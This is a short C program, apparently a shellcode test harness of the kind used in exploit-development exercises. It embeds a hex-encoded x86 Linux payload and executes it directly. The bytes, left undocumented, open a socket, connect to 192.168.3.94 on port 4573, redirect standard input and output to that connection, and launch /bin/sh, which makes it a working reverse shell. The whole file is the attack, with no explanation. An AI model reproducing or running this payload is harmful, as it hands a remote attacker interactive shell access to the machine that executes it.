#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x68\xc0\xa8\x03\x5e\x66\x68\x11\xdd\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x5b\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
;

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
